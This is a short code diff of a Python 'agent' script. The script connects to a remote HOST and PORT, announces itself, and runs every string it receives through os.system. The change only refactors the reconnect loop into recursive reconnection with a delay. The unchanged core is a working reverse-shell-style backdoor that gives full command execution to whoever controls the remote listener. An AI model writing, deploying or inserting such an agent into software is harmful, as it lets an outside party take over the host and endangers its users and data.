@@ -21,37 +21,22 @@ def connect_agent():
     sock = socket(AF_INET, SOCK_STREAM)
     addr = (HOST, PORT)
     LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
-    sock.connect(addr)
-    while True:
-        try:
+    try:
+        sock.connect(addr)
+        while True:
             sock.send('Agent is here')
             data = sock.recv(1024)
             if not data:
                 continue
             LOG.info('Received {}'.format(data))
             os.system(data)
-        except:
-            reconnect_agent()
-
-
-def reconnect_agent():
-    sock = socket(AF_INET, SOCK_STREAM)
-    toBreak = False
-    while True:
-        sock.close()
-        try:
-            connect_agent()
-            toBreak = True
-        except KeyboardInterrupt:
-            sys.exit()
-        except:
-            pass
-        if toBreak:
-            break
+    except:
+        LOG.info('Reconnecting...')
         time.sleep(1)
+        connect_agent()
 
 if __name__ == '__main__':
     try:
-        reconnect_agent()
+        connect_agent()
     except KeyboardInterrupt:
         sys.exit()
